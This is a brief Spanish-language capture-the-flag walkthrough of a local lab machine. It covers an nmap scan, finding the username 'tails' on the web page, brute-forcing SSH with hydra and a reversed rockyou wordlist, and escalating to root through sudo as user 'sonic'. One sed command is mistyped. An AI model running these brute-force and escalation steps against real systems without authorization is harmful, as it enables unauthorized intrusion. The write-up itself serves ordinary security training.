`ping 172.17.0.2`
#### hacemos un ping para comprobar si la maquina esta prendida
[![ping.png](https://i.postimg.cc/vH0MWKQc/ping.png)](https://postimg.cc/0bKLvcKs)

`nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2`
#### usamos Nmap para descubrir si tiene puertos abiertos
[![nmap.png](https://i.postimg.cc/rwbkHtRT/nmap.png)](https://postimg.cc/k2xz6GyY)
vemos que esta abierto el puerto 22 version 9.6 que es una version no vulnerable y vemos el puerto 80 un apache

#### esto corre por el 80:
[![web.png](https://i.postimg.cc/8c1QvR9R/web.png)](https://postimg.cc/JDd2Vk10)
encontramos lo que parece ser un usuario "tails"

`hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
#### usamos hydra para tratar de encontrar la contraseña 
[![hydra.png](https://i.postimg.cc/43DXYhXP/hydra.png)](https://postimg.cc/f3fGFytS)
vemos que tarda demasiado entonces podemos usar tac para invertir el diccionario y comenzar desde el final

`tac /usr/share/wordlists/rockyou.txt >> dicinv.txt`

esto es para eliminar los espacios en blanco
`sed - 's/ //g' dicinv`
#### ahora si probamos de nuevo
[![hydrainv.png](https://i.postimg.cc/GpyCnhvy/hydrainv.png)](https://postimg.cc/kVqZxC1J)

vemos el usuario y la contraseña ahora probamos las crenciales

`ssh tails@172.17.0.2`
#### entramos con las credenciales
[![ssh.png](https://i.postimg.cc/nzKfMRRV/ssh.png)](https://postimg.cc/9RfnnpHs)

`sudo -l`
#### lo usamos para ver que permisos tenemos
[![sudo-l.png](https://i.postimg.cc/XJ60jSgD/sudo-l.png)](https://postimg.cc/sBmLmLqp)

vemos que sonic tiene permiso para todo asi que nos volvemos sonic

`sudo -u sonic bash`
#### nos volvemos sonic
[![sonic.png](https://i.postimg.cc/pLyvkBTk/sonic.png)](https://postimg.cc/zym4GKTR)

#### ahora nos hacemos root
`sudo su`

[![root.png](https://i.postimg.cc/WbNTqVcB/root.png)](https://postimg.cc/3WcPzPR1)

